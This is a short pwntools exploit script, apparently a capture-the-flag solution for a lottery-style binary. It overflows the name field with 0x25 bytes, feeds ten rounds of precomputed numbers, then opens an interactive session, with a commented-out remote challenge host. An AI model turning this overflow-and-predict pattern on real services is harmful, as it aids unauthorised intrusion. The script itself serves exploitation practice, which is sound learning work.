from pwn import *

r=process("./pwn")
#r=remote("39.107.58.236",48841)
pause()

r.recvuntil(b"Enter your name:")
r.send(b"a"*0x25)
r.recvuntil(b"Now start your game!")
#r.interactive()
r.recvuntil("please choose your numbers:")
r.sendline(b"187")
r.sendline(b"164")
r.sendline(b"39")


r.recvuntil("please choose your numbers:")
r.sendline(b"242")
r.sendline(b"143")
r.sendline(b"25")

r.recvuntil("please choose your numbers:")
r.sendline(b"188")
r.sendline(b"128")
r.sendline(b"73")

r.recvuntil("please choose your numbers:")
r.sendline(b"94")
r.sendline(b"5")
r.sendline(b"207")

r.recvuntil("please choose your numbers:")
r.sendline(b"233")
r.sendline(b"166")
r.sendline(b"214")


r.recvuntil("please choose your numbers:")
r.sendline(b"61")
r.sendline(b"103")
r.sendline(b"137")

r.recvuntil("please choose your numbers:")
r.sendline(b"248")
r.sendline(b"178")
r.sendline(b"38")

r.recvuntil("please choose your numbers:")
r.sendline(b"99")
r.sendline(b"55")
r.sendline(b"146")

r.recvuntil("please choose your numbers:")
r.sendline(b"237")
r.sendline(b"49")
r.sendline(b"226")

r.recvuntil("please choose your numbers:")
r.sendline(b"73")
r.sendline(b"156")
r.sendline(b"149")

r.interactive()
#187 164 39 
#242 143 25 
#188 128 73
#94 5 207
#233 166 214
#61 103 137
#248 178 38
#99 55 146
#237 49 226
#73 156 149
